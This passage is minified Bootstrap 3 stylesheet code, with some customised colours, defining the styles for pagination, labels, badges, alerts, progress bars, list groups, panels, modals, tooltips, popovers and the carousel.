12px;margin-left:-1px;line-height:1.42857143;color:#337ab7;text-decoration:none;background-color:#fff;border:1px solid #ddd}.pagination>li:first-child>a,.pagination>li:first-child>span{margin-left:0;border-top-left-radius:4px;border-bottom-left-radius:4px}.pagination>li:last-child>a,.pagination>li:last-child>span{border-top-right-radius:4px;border-bottom-right-radius:4px}.pagination>li>a:focus,.pagination>li>a:hover,.pagination>li>span:focus,.pagination>li>span:hover{color:#23527c;background-color:#eee;border-color:#ddd}.pagination>.active>a,.pagination>.active>a:focus,.pagination>.active>a:hover,.pagination>.active>span,.pagination>.active>span:focus,.pagination>.active>span:hover{z-index:2;color:#fff;cursor:default;background-color:#337ab7;border-color:#337ab7}.pagination>.disabled>a,.pagination>.disabled>a:focus,.pagination>.disabled>a:hover,.pagination>.disabled>span,.pagination>.disabled>span:focus,.pagination>.disabled>span:hover{color:#777;cursor:not-allowed;background-color:#fff;border-color:#ddd}.pagination-lg>li>a,.pagination-lg>li>span{padding:10px 16px;font-size:18px}.pagination-lg>li:first-child>a,.pagination-lg>li:first-child>span{border-top-left-radius:6px;border-bottom-left-radius:6px}.pagination-lg>li:last-child>a,.pagination-lg>li:last-child>span{border-top-right-radius:6px;border-bottom-right-radius:6px}.pagination-sm>li>a,.pagination-sm>li>span{padding:5px 10px;font-size:12px}.pagination-sm>li:first-child>a,.pagination-sm>li:first-child>span{border-top-left-radius:3px;border-bottom-left-radius:3px}.pagination-sm>li:last-child>a,.pagination-sm>li:last-child>span{border-top-right-radius:3px;border-bottom-right-radius:3px}.pager{padding-left:0;margin:20px 0;text-align:center;list-style:none}.pager li{display:inline}.pager li>a,.pager li>span{display:inline-block;padding:5px 14px;background-color:#fff;border:1px solid #ddd;border-radius:15px}.pager li>a:focus,.pager li>a:hover{text-decoration:none;background-color:#eee}.pager .next>a,.pager .next>span{float:right}.pager .previous>a,.pager .previous>span{float:left}.pager .disabled>a,.pager .disabled>a:focus,.pager .disabled>a:hover,.pager .disabled>span{color:#777;cursor:not-allowed;background-color:#fff}.label{display:inline;padding:.2em .6em .3em;font-size:75%;font-weight:700;line-height:1;color:#fff;text-align:center;white-space:nowrap;vertical-align:baseline;border-radius:.25em}a.label:focus,a.label:hover{color:#fff;text-decoration:none;cursor:pointer}.label:empty{display:none}.btn .label{position:relative;top:-1px}.label-default{background-color:#777}.label-default[href]:focus,.label-default[href]:hover{background-color:#5e5e5e}.label-primary{background-color:#337ab7}.label-primary[href]:focus,.label-primary[href]:hover{background-color:#286090}.label-success{background-color:#5cb85c}.label-success[href]:focus,.label-success[href]:hover{background-color:#449d44}.label-info{background-color:#5bc0de}.label-info[href]:focus,.label-info[href]:hover{background-color:#31b0d5}.label-warning{background-color:#f0ad4e}.label-warning[href]:focus,.label-warning[href]:hover{background-color:#ec971f}.label-danger{background-color:#d9534f}.label-danger[href]:focus,.label-danger[href]:hover{background-color:#c9302c}.badge{display:inline-block;min-width:10px;padding:3px 7px;font-size:12px;font-weight:700;line-height:1;color:#fff;text-align:center;white-space:nowrap;vertical-align:baseline;background-color:#777;border-radius:10px}.badge:empty{display:none}.btn .badge{position:relative;top:-1px}.btn-group-xs>.btn .badge,.btn-xs .badge{top:0;padding:1px 5px}a.badge:focus,a.badge:hover{color:#fff;text-decoration:none;cursor:pointer}.list-group-item.active>.badge,.nav-pills>.active>a>.badge{color:#337ab7;background-color:#fff}.list-group-item>.badge{float:right}.list-group-item>.badge+.badge{margin-right:5px}.nav-pills>li>a>.badge{margin-left:3px}.jumbotron{padding:30px 15px;margin-bottom:30px;color:inherit;background-color:#666}.jumbotron .h1,.jumbotron h1{color:inherit}.jumbotron p{margin-bottom:15px;font-size:21px;font-weight:200}.jumbotron>hr{border-top-color:#d5d5d5}.container .jumbotron,.container-fluid .jumbotron{border-radius:6px}.jumbotron .container{max-width:100%}@media screen and (min-width:768px){.jumbotron{padding:48px 0}.container .jumbotron,.container-fluid .jumbotron{padding-right:60px;padding-left:60px}.jumbotron .h1,.jumbotron h1{font-size:63px}}.thumbnail{display:block;padding:4px;margin-bottom:20px;line-height:1.42857143;background-color:#fff;border:1px solid #ddd;border-radius:4px;-webkit-transition:border .2s ease-in-out;-o-transition:border .2s ease-in-out;transition:border .2s ease-in-out}.thumbnail a>img,.thumbnail>img{margin-right:auto;margin-left:auto}a.thumbnail.active,a.thumbnail:focus,a.thumbnail:hover{border-color:#337ab7}.thumbnail .caption{padding:9px;color:#333}.alert{padding:15px;margin-bottom:20px;border:1px solid transparent;border-radius:4px}.alert h4{margin-top:0;color:inherit}.alert .alert-link{font-weight:700}.alert>p,.alert>ul{margin-bottom:0}.alert>p+p{margin-top:5px}.alert-dismissable,.alert-dismissible{padding-right:35px}.alert-dismissable .close,.alert-dismissible .close{position:relative;top:-2px;right:-21px;color:inherit}.alert-success{color:#3c763d;background-color:#dff0d8;border-color:#d6e9c6}.alert-success hr{border-top-color:#c9e2b3}.alert-success .alert-link{color:#2b542c}.alert-info{color:#31708f;background-color:#d9edf7;border-color:#bce8f1}.alert-info hr{border-top-color:#a6e1ec}.alert-info .alert-link{color:#245269}.alert-warning{color:#8a6d3b;background-color:#fcf8e3;border-color:#faebcc}.alert-warning hr{border-top-color:#f7e1b5}.alert-warning .alert-link{color:#66512c}.alert-danger{color:#a94442;background-color:#f2dede;border-color:#ebccd1}.alert-danger hr{border-top-color:#e4b9c0}.alert-danger .alert-link{color:#843534}@-webkit-keyframes progress-bar-stripes{from{background-position:40px 0}to{background-position:0 0}}@-o-keyframes progress-bar-stripes{from{background-position:40px 0}to{background-position:0 0}}@keyframes progress-bar-stripes{from{background-position:40px 0}to{background-position:0 0}}.progress{height:20px;margin-bottom:20px;overflow:hidden;background-color:#f5f5f5;border-radius:4px;-webkit-box-shadow:inset 0 1px 2px rgba(0,0,0,.1);box-shadow:inset 0 1px 2px rgba(0,0,0,.1)}.progress-bar{float:left;width:0;height:100%;font-size:12px;line-height:20px;color:#fff;text-align:center;background-color:#337ab7;-webkit-box-shadow:inset 0 -1px 0 rgba(0,0,0,.15);box-shadow:inset 0 -1px 0 rgba(0,0,0,.15);-webkit-transition:width .6s ease;-o-transition:width .6s ease;transition:width .6s ease}.progress-bar-striped,.progress-striped .progress-bar{background-image:-webkit-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:-o-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);-webkit-background-size:40px 40px;background-size:40px 40px}.progress-bar.active,.progress.active .progress-bar{-webkit-animation:progress-bar-stripes 2s linear infinite;-o-animation:progress-bar-stripes 2s linear infinite;animation:progress-bar-stripes 2s linear infinite}.progress-bar-success{background-color:#5cb85c}.progress-striped .progress-bar-success{background-image:-webkit-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:-o-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent)}.progress-bar-info{background-color:#5bc0de}.progress-striped .progress-bar-info{background-image:-webkit-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:-o-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent)}.progress-bar-warning{background-color:#f0ad4e}.progress-striped .progress-bar-warning{background-image:-webkit-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:-o-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent)}.progress-bar-danger{background-color:#d9534f}.progress-striped .progress-bar-danger{background-image:-webkit-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:-o-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);background-image:linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent)}.media{margin-top:15px}.media:first-child{margin-top:0}.media,.media-body{overflow:hidden;zoom:1}.media-body{width:10000px}.media-object{display:block}.media-right,.media>.pull-right{padding-left:10px}.media-left,.media>.pull-left{padding-right:10px}.media-body,.media-left,.media-right{display:table-cell;vertical-align:top}.media-middle{vertical-align:middle}.media-bottom{vertical-align:bottom}.media-heading{margin-top:0;margin-bottom:5px}.media-list{padding-left:0;list-style:none}.list-group{padding-left:0;margin-bottom:20px}.list-group-item{position:relative;display:block;padding:10px 15px;margin-bottom:-1px;background-color:#fff;border:1px solid #ddd}.list-group-item:first-child{border-top-left-radius:4px;border-top-right-radius:4px}.list-group-item:last-child{margin-bottom:0;border-bottom-right-radius:4px;border-bottom-left-radius:4px}a.list-group-item{color:#555}a.list-group-item .list-group-item-heading{color:#333}a.list-group-item:focus,a.list-group-item:hover{color:#555;text-decoration:none;background-color:#f5f5f5}.list-group-item.disabled,.list-group-item.disabled:focus,.list-group-item.disabled:hover{color:#777;cursor:not-allowed;background-color:#eee}.list-group-item.disabled .list-group-item-heading,.list-group-item.disabled:focus .list-group-item-heading,.list-group-item.disabled:hover .list-group-item-heading{color:inherit}.list-group-item.disabled .list-group-item-text,.list-group-item.disabled:focus .list-group-item-text,.list-group-item.disabled:hover .list-group-item-text{color:#777}.list-group-item.active,.list-group-item.active:focus,.list-group-item.active:hover{z-index:2;color:#fff;background-color:#337ab7;border-color:#337ab7}.list-group-item.active .list-group-item-heading,.list-group-item.active .list-group-item-heading>.small,.list-group-item.active .list-group-item-heading>small,.list-group-item.active:focus .list-group-item-heading,.list-group-item.active:focus .list-group-item-heading>.small,.list-group-item.active:focus .list-group-item-heading>small,.list-group-item.active:hover .list-group-item-heading,.list-group-item.active:hover .list-group-item-heading>.small,.list-group-item.active:hover .list-group-item-heading>small{color:inherit}.list-group-item.active .list-group-item-text,.list-group-item.active:focus .list-group-item-text,.list-group-item.active:hover .list-group-item-text{color:#c7ddef}.list-group-item-success{color:#3c763d;background-color:#dff0d8}a.list-group-item-success{color:#3c763d}a.list-group-item-success .list-group-item-heading{color:inherit}a.list-group-item-success:focus,a.list-group-item-success:hover{color:#3c763d;background-color:#d0e9c6}a.list-group-item-success.active,a.list-group-item-success.active:focus,a.list-group-item-success.active:hover{color:#fff;background-color:#3c763d;border-color:#3c763d}.list-group-item-info{color:#31708f;background-color:#d9edf7}a.list-group-item-info{color:#31708f}a.list-group-item-info .list-group-item-heading{color:inherit}a.list-group-item-info:focus,a.list-group-item-info:hover{color:#31708f;background-color:#c4e3f3}a.list-group-item-info.active,a.list-group-item-info.active:focus,a.list-group-item-info.active:hover{color:#fff;background-color:#31708f;border-color:#31708f}.list-group-item-warning{color:#8a6d3b;background-color:#fcf8e3}a.list-group-item-warning{color:#8a6d3b}a.list-group-item-warning .list-group-item-heading{color:inherit}a.list-group-item-warning:focus,a.list-group-item-warning:hover{color:#8a6d3b;background-color:#faf2cc}a.list-group-item-warning.active,a.list-group-item-warning.active:focus,a.list-group-item-warning.active:hover{color:#fff;background-color:#8a6d3b;border-color:#8a6d3b}.list-group-item-danger{color:#a94442;background-color:#f2dede}a.list-group-item-danger{color:#a94442}a.list-group-item-danger .list-group-item-heading{color:inherit}a.list-group-item-danger:focus,a.list-group-item-danger:hover{color:#a94442;background-color:#ebcccc}a.list-group-item-danger.active,a.list-group-item-danger.active:focus,a.list-group-item-danger.active:hover{color:#fff;background-color:#a94442;border-color:#a94442}.list-group-item-heading{margin-top:0;margin-bottom:5px}.list-group-item-text{margin-bottom:0;line-height:1.3}.panel{margin-bottom:20px;background-color:#666;border:1px solid transparent;border-radius:4px;-webkit-box-shadow:0 1px 1px rgba(0,0,0,.05);box-shadow:0 1px 1px rgba(0,0,0,.05)}.panel-body{padding:15px}.panel-heading{padding:10px 15px;border-bottom:1px solid transparent;border-top-left-radius:3px;border-top-right-radius:3px}.panel-heading>.dropdown .dropdown-toggle{color:inherit}.panel-title{margin-top:0;margin-bottom:0;font-size:16px;color:inherit}.panel-title>.small,.panel-title>.small>a,.panel-title>a,.panel-title>small,.panel-title>small>a{color:inherit}.panel-footer{padding:10px 15px;background-color:#f5f5f5;border-top:1px solid #ddd;border-bottom-right-radius:3px;border-bottom-left-radius:3px}.panel>.list-group,.panel>.panel-collapse>.list-group{margin-bottom:0}.panel>.list-group .list-group-item,.panel>.panel-collapse>.list-group .list-group-item{border-width:1px 0;border-radius:0}.panel>.list-group:first-child .list-group-item:first-child,.panel>.panel-collapse>.list-group:first-child .list-group-item:first-child{border-top:0;border-top-left-radius:3px;border-top-right-radius:3px}.panel>.list-group:last-child .list-group-item:last-child,.panel>.panel-collapse>.list-group:last-child .list-group-item:last-child{border-bottom:0;border-bottom-right-radius:3px;border-bottom-left-radius:3px}.panel-heading+.list-group .list-group-item:first-child{border-top-width:0}.list-group+.panel-footer{border-top-width:0}.panel>.panel-collapse>.table,.panel>.table,.panel>.table-responsive>.table{margin-bottom:0}.panel>.panel-collapse>.table caption,.panel>.table caption,.panel>.table-responsive>.table caption{padding-right:15px;padding-left:15px}.panel>.table-responsive:first-child>.table:first-child,.panel>.table:first-child{border-top-left-radius:3px;border-top-right-radius:3px}.panel>.table-responsive:first-child>.table:first-child>tbody:first-child>tr:first-child,.panel>.table-responsive:first-child>.table:first-child>thead:first-child>tr:first-child,.panel>.table:first-child>tbody:first-child>tr:first-child,.panel>.table:first-child>thead:first-child>tr:first-child{border-top-left-radius:3px;border-top-right-radius:3px}.panel>.table-responsive:first-child>.table:first-child>tbody:first-child>tr:first-child td:first-child,.panel>.table-responsive:first-child>.table:first-child>tbody:first-child>tr:first-child th:first-child,.panel>.table-responsive:first-child>.table:first-child>thead:first-child>tr:first-child td:first-child,.panel>.table-responsive:first-child>.table:first-child>thead:first-child>tr:first-child th:first-child,.panel>.table:first-child>tbody:first-child>tr:first-child td:first-child,.panel>.table:first-child>tbody:first-child>tr:first-child th:first-child,.panel>.table:first-child>thead:first-child>tr:first-child td:first-child,.panel>.table:first-child>thead:first-child>tr:first-child th:first-child{border-top-left-radius:3px}.panel>.table-responsive:first-child>.table:first-child>tbody:first-child>tr:first-child td:last-child,.panel>.table-responsive:first-child>.table:first-child>tbody:first-child>tr:first-child th:last-child,.panel>.table-responsive:first-child>.table:first-child>thead:first-child>tr:first-child td:last-child,.panel>.table-responsive:first-child>.table:first-child>thead:first-child>tr:first-child th:last-child,.panel>.table:first-child>tbody:first-child>tr:first-child td:last-child,.panel>.table:first-child>tbody:first-child>tr:first-child th:last-child,.panel>.table:first-child>thead:first-child>tr:first-child td:last-child,.panel>.table:first-child>thead:first-child>tr:first-child th:last-child{border-top-right-radius:3px}.panel>.table-responsive:last-child>.table:last-child,.panel>.table:last-child{border-bottom-right-radius:3px;border-bottom-left-radius:3px}.panel>.table-responsive:last-child>.table:last-child>tbody:last-child>tr:last-child,.panel>.table-responsive:last-child>.table:last-child>tfoot:last-child>tr:last-child,.panel>.table:last-child>tbody:last-child>tr:last-child,.panel>.table:last-child>tfoot:last-child>tr:last-child{border-bottom-right-radius:3px;border-bottom-left-radius:3px}.panel>.table-responsive:last-child>.table:last-child>tbody:last-child>tr:last-child td:first-child,.panel>.table-responsive:last-child>.table:last-child>tbody:last-child>tr:last-child th:first-child,.panel>.table-responsive:last-child>.table:last-child>tfoot:last-child>tr:last-child td:first-child,.panel>.table-responsive:last-child>.table:last-child>tfoot:last-child>tr:last-child th:first-child,.panel>.table:last-child>tbody:last-child>tr:last-child td:first-child,.panel>.table:last-child>tbody:last-child>tr:last-child th:first-child,.panel>.table:last-child>tfoot:last-child>tr:last-child td:first-child,.panel>.table:last-child>tfoot:last-child>tr:last-child th:first-child{border-bottom-left-radius:3px}.panel>.table-responsive:last-child>.table:last-child>tbody:last-child>tr:last-child td:last-child,.panel>.table-responsive:last-child>.table:last-child>tbody:last-child>tr:last-child th:last-child,.panel>.table-responsive:last-child>.table:last-child>tfoot:last-child>tr:last-child td:last-child,.panel>.table-responsive:last-child>.table:last-child>tfoot:last-child>tr:last-child th:last-child,.panel>.table:last-child>tbody:last-child>tr:last-child td:last-child,.panel>.table:last-child>tbody:last-child>tr:last-child th:last-child,.panel>.table:last-child>tfoot:last-child>tr:last-child td:last-child,.panel>.table:last-child>tfoot:last-child>tr:last-child th:last-child{border-bottom-right-radius:3px}.panel>.panel-body+.table,.panel>.panel-body+.table-responsive,.panel>.table+.panel-body,.panel>.table-responsive+.panel-body{border-top:1px solid #ddd}.panel>.table>tbody:first-child>tr:first-child td,.panel>.table>tbody:first-child>tr:first-child th{border-top:0}.panel>.table-bordered,.panel>.table-responsive>.table-bordered{border:0}.panel>.table-bordered>tbody>tr>td:first-child,.panel>.table-bordered>tbody>tr>th:first-child,.panel>.table-bordered>tfoot>tr>td:first-child,.panel>.table-bordered>tfoot>tr>th:first-child,.panel>.table-bordered>thead>tr>td:first-child,.panel>.table-bordered>thead>tr>th:first-child,.panel>.table-responsive>.table-bordered>tbody>tr>td:first-child,.panel>.table-responsive>.table-bordered>tbody>tr>th:first-child,.panel>.table-responsive>.table-bordered>tfoot>tr>td:first-child,.panel>.table-responsive>.table-bordered>tfoot>tr>th:first-child,.panel>.table-responsive>.table-bordered>thead>tr>td:first-child,.panel>.table-responsive>.table-bordered>thead>tr>th:first-child{border-left:0}.panel>.table-bordered>tbody>tr>td:last-child,.panel>.table-bordered>tbody>tr>th:last-child,.panel>.table-bordered>tfoot>tr>td:last-child,.panel>.table-bordered>tfoot>tr>th:last-child,.panel>.table-bordered>thead>tr>td:last-child,.panel>.table-bordered>thead>tr>th:last-child,.panel>.table-responsive>.table-bordered>tbody>tr>td:last-child,.panel>.table-responsive>.table-bordered>tbody>tr>th:last-child,.panel>.table-responsive>.table-bordered>tfoot>tr>td:last-child,.panel>.table-responsive>.table-bordered>tfoot>tr>th:last-child,.panel>.table-responsive>.table-bordered>thead>tr>td:last-child,.panel>.table-responsive>.table-bordered>thead>tr>th:last-child{border-right:0}.panel>.table-bordered>tbody>tr:first-child>td,.panel>.table-bordered>tbody>tr:first-child>th,.panel>.table-bordered>thead>tr:first-child>td,.panel>.table-bordered>thead>tr:first-child>th,.panel>.table-responsive>.table-bordered>tbody>tr:first-child>td,.panel>.table-responsive>.table-bordered>tbody>tr:first-child>th,.panel>.table-responsive>.table-bordered>thead>tr:first-child>td,.panel>.table-responsive>.table-bordered>thead>tr:first-child>th{border-bottom:0}.panel>.table-bordered>tbody>tr:last-child>td,.panel>.table-bordered>tbody>tr:last-child>th,.panel>.table-bordered>tfoot>tr:last-child>td,.panel>.table-bordered>tfoot>tr:last-child>th,.panel>.table-responsive>.table-bordered>tbody>tr:last-child>td,.panel>.table-responsive>.table-bordered>tbody>tr:last-child>th,.panel>.table-responsive>.table-bordered>tfoot>tr:last-child>td,.panel>.table-responsive>.table-bordered>tfoot>tr:last-child>th{border-bottom:0}.panel>.table-responsive{margin-bottom:0;border:0}.panel-group{margin-bottom:20px}.panel-group .panel{margin-bottom:0;border-radius:4px}.panel-group .panel+.panel{margin-top:5px}.panel-group .panel-heading{border-bottom:0}.panel-group .panel-heading+.panel-collapse>.list-group,.panel-group .panel-heading+.panel-collapse>.panel-body{border-top:1px solid #ddd}.panel-group .panel-footer{border-top:0}.panel-group .panel-footer+.panel-collapse .panel-body{border-bottom:1px solid #ddd}.panel-default{border-color:#ddd}.panel-default>.panel-heading{color:#333;background-color:#f5f5f5;border-color:#ddd}.panel-default>.panel-heading+.panel-collapse>.panel-body{border-top-color:#ddd}.panel-default>.panel-heading .badge{color:#f5f5f5;background-color:#333}.panel-default>.panel-footer+.panel-collapse>.panel-body{border-bottom-color:#ddd}.panel-primary{border-color:#3c3c3c}.panel-primary>.panel-heading{color:#fff;background-color:#3c3c3c;border-color:#3c3c3c}.panel-primary>.panel-heading+.panel-collapse>.panel-body{border-top-color:#3c3c3c}.panel-primary>.panel-heading .badge{color:#3c3c3c;background-color:#fff}.panel-primary>.panel-footer+.panel-collapse>.panel-body{border-bottom-color:#3c3c3c}.panel-success{border-color:#d6e9c6}.panel-success>.panel-heading{color:#3c763d;background-color:#dff0d8;border-color:#d6e9c6}.panel-success>.panel-heading+.panel-collapse>.panel-body{border-top-color:#d6e9c6}.panel-success>.panel-heading .badge{color:#dff0d8;background-color:#3c763d}.panel-success>.panel-footer+.panel-collapse>.panel-body{border-bottom-color:#d6e9c6}.panel-info{border-color:#bce8f1}.panel-info>.panel-heading{color:#31708f;background-color:#d9edf7;border-color:#bce8f1}.panel-info>.panel-heading+.panel-collapse>.panel-body{border-top-color:#bce8f1}.panel-info>.panel-heading .badge{color:#d9edf7;background-color:#31708f}.panel-info>.panel-footer+.panel-collapse>.panel-body{border-bottom-color:#bce8f1}.panel-warning{border-color:#faebcc}.panel-warning>.panel-heading{color:#8a6d3b;background-color:#fcf8e3;border-color:#faebcc}.panel-warning>.panel-heading+.panel-collapse>.panel-body{border-top-color:#faebcc}.panel-warning>.panel-heading .badge{color:#fcf8e3;background-color:#8a6d3b}.panel-warning>.panel-footer+.panel-collapse>.panel-body{border-bottom-color:#faebcc}.panel-danger{border-color:#ebccd1}.panel-danger>.panel-heading{color:#a94442;background-color:#f2dede;border-color:#ebccd1}.panel-danger>.panel-heading+.panel-collapse>.panel-body{border-top-color:#ebccd1}.panel-danger>.panel-heading .badge{color:#f2dede;background-color:#a94442}.panel-danger>.panel-footer+.panel-collapse>.panel-body{border-bottom-color:#ebccd1}.embed-responsive{position:relative;display:block;height:0;padding:0;overflow:hidden}.embed-responsive .embed-responsive-item,.embed-responsive embed,.embed-responsive iframe,.embed-responsive object,.embed-responsive video{position:absolute;top:0;bottom:0;left:0;width:100%;height:100%;border:0}.embed-responsive-16by9{padding-bottom:56.25%}.embed-responsive-4by3{padding-bottom:75%}.well{min-height:20px;padding:19px;margin-bottom:20px;background-color:#f5f5f5;border:1px solid #e3e3e3;border-radius:4px;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.05);box-shadow:inset 0 1px 1px rgba(0,0,0,.05)}.well blockquote{border-color:#ddd;border-color:rgba(0,0,0,.15)}.well-lg{padding:24px;border-radius:6px}.well-sm{padding:9px;border-radius:3px}.close{float:right;font-size:21px;font-weight:700;line-height:1;color:#000;text-shadow:0 1px 0 #fff;filter:alpha(opacity=20);opacity:.2}.close:focus,.close:hover{color:#000;text-decoration:none;cursor:pointer;filter:alpha(opacity=50);opacity:.5}button.close{-webkit-appearance:none;padding:0;cursor:pointer;background:0 0;border:0}.modal-open{overflow:hidden}.modal{position:fixed;top:0;right:0;bottom:0;left:0;z-index:1050;display:none;overflow:hidden;-webkit-overflow-scrolling:touch;outline:0}.modal.fade .modal-dialog{-webkit-transition:-webkit-transform .3s ease-out;-o-transition:-o-transform .3s ease-out;transition:transform .3s ease-out;-webkit-transform:translate(0,-25%);-ms-transform:translate(0,-25%);-o-transform:translate(0,-25%);transform:translate(0,-25%)}.modal.in .modal-dialog{-webkit-transform:translate(0,0);-ms-transform:translate(0,0);-o-transform:translate(0,0);transform:translate(0,0)}.modal-open .modal{overflow-x:hidden;overflow-y:auto}.modal-dialog{position:relative;width:auto;margin:10px}.modal-content{position:relative;background-color:#555;-webkit-background-clip:padding-box;background-clip:padding-box;border:1px solid #999;border:1px solid rgba(0,0,0,.2);border-radius:6px;outline:0;-webkit-box-shadow:0 3px 9px rgba(0,0,0,.5);box-shadow:0 3px 9px rgba(0,0,0,.5)}.modal-backdrop{position:fixed;top:0;right:0;bottom:0;left:0;z-index:1040;background-color:#000}.modal-backdrop.fade{filter:alpha(opacity=0);opacity:0}.modal-backdrop.in{filter:alpha(opacity=50);opacity:.5}.modal-header{min-height:16.43px;padding:15px;border-bottom:1px solid #e5e5e5}.modal-header .close{margin-top:-2px}.modal-title{margin:0;line-height:1.42857143}.modal-body{position:relative;padding:15px}.modal-footer{padding:15px;text-align:right;border-top:1px solid #e5e5e5}.modal-footer .btn+.btn{margin-bottom:0;margin-left:5px}.modal-footer .btn-group .btn+.btn{margin-left:-1px}.modal-footer .btn-block+.btn-block{margin-left:0}.modal-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}@media (min-width:768px){.modal-dialog{width:600px;margin:30px auto}.modal-content{-webkit-box-shadow:0 5px 15px rgba(0,0,0,.5);box-shadow:0 5px 15px rgba(0,0,0,.5)}.modal-sm{width:300px}}@media (min-width:992px){.modal-lg{width:900px}}.tooltip{position:absolute;z-index:1070;display:block;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;font-size:12px;font-weight:400;line-height:1.4;filter:alpha(opacity=0);opacity:0}.tooltip.in{filter:alpha(opacity=90);opacity:.9}.tooltip.top{padding:5px 0;margin-top:-3px}.tooltip.right{padding:0 5px;margin-left:3px}.tooltip.bottom{padding:5px 0;margin-top:3px}.tooltip.left{padding:0 5px;margin-left:-3px}.tooltip-inner{max-width:200px;padding:3px 8px;color:#fff;text-align:center;text-decoration:none;background-color:#000;border-radius:4px}.tooltip-arrow{position:absolute;width:0;height:0;border-color:transparent;border-style:solid}.tooltip.top .tooltip-arrow{bottom:0;left:50%;margin-left:-5px;border-width:5px 5px 0;border-top-color:#000}.tooltip.top-left .tooltip-arrow{right:5px;bottom:0;margin-bottom:-5px;border-width:5px 5px 0;border-top-color:#000}.tooltip.top-right .tooltip-arrow{bottom:0;left:5px;margin-bottom:-5px;border-width:5px 5px 0;border-top-color:#000}.tooltip.right .tooltip-arrow{top:50%;left:0;margin-top:-5px;border-width:5px 5px 5px 0;border-right-color:#000}.tooltip.left .tooltip-arrow{top:50%;right:0;margin-top:-5px;border-width:5px 0 5px 5px;border-left-color:#000}.tooltip.bottom .tooltip-arrow{top:0;left:50%;margin-left:-5px;border-width:0 5px 5px;border-bottom-color:#000}.tooltip.bottom-left .tooltip-arrow{top:0;right:5px;margin-top:-5px;border-width:0 5px 5px;border-bottom-color:#000}.tooltip.bottom-right .tooltip-arrow{top:0;left:5px;margin-top:-5px;border-width:0 5px 5px;border-bottom-color:#000}.popover{position:absolute;top:0;left:0;z-index:1060;display:none;max-width:276px;padding:1px;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;font-size:14px;font-weight:400;line-height:1.42857143;text-align:left;white-space:normal;background-color:#fff;-webkit-background-clip:padding-box;background-clip:padding-box;border:1px solid #ccc;border:1px solid rgba(0,0,0,.2);border-radius:6px;-webkit-box-shadow:0 5px 10px rgba(0,0,0,.2);box-shadow:0 5px 10px rgba(0,0,0,.2)}.popover.top{margin-top:-10px}.popover.right{margin-left:10px}.popover.bottom{margin-top:10px}.popover.left{margin-left:-10px}.popover-title{padding:8px 14px;margin:0;font-size:14px;background-color:#f7f7f7;border-bottom:1px solid #ebebeb;border-radius:5px 5px 0 0}.popover-content{padding:9px 14px}.popover>.arrow,.popover>.arrow:after{position:absolute;display:block;width:0;height:0;border-color:transparent;border-style:solid}.popover>.arrow{border-width:11px}.popover>.arrow:after{content:"";border-width:10px}.popover.top>.arrow{bottom:-11px;left:50%;margin-left:-11px;border-top-color:#999;border-top-color:rgba(0,0,0,.25);border-bottom-width:0}.popover.top>.arrow:after{bottom:1px;margin-left:-10px;content:" ";border-top-color:#fff;border-bottom-width:0}.popover.right>.arrow{top:50%;left:-11px;margin-top:-11px;border-right-color:#999;border-right-color:rgba(0,0,0,.25);border-left-width:0}.popover.right>.arrow:after{bottom:-10px;left:1px;content:" ";border-right-color:#fff;border-left-width:0}.popover.bottom>.arrow{top:-11px;left:50%;margin-left:-11px;border-top-width:0;border-bottom-color:#999;border-bottom-color:rgba(0,0,0,.25)}.popover.bottom>.arrow:after{top:1px;margin-left:-10px;content:" ";border-top-width:0;border-bottom-color:#fff}.popover.left>.arrow{top:50%;right:-11px;margin-top:-11px;border-right-width:0;border-left-color:#999;border-left-color:rgba(0,0,0,.25)}.popover.left>.arrow:after{right:1px;bottom:-10px;content:" ";border-right-width:0;border-left-color:#fff}.carousel{position:relative}.carousel-inner{position:relative;width:100%;overflow:hidden}.carousel-inner>.item{position:relative;display:none;-webkit-transition:.6s ease-in-out left;-o-transition:.6s ease-in-out left;transition:.6s ease-in-out left}.carousel-inner>.item>a>img,.carousel-inner>.item>img{line-height:1}@media all 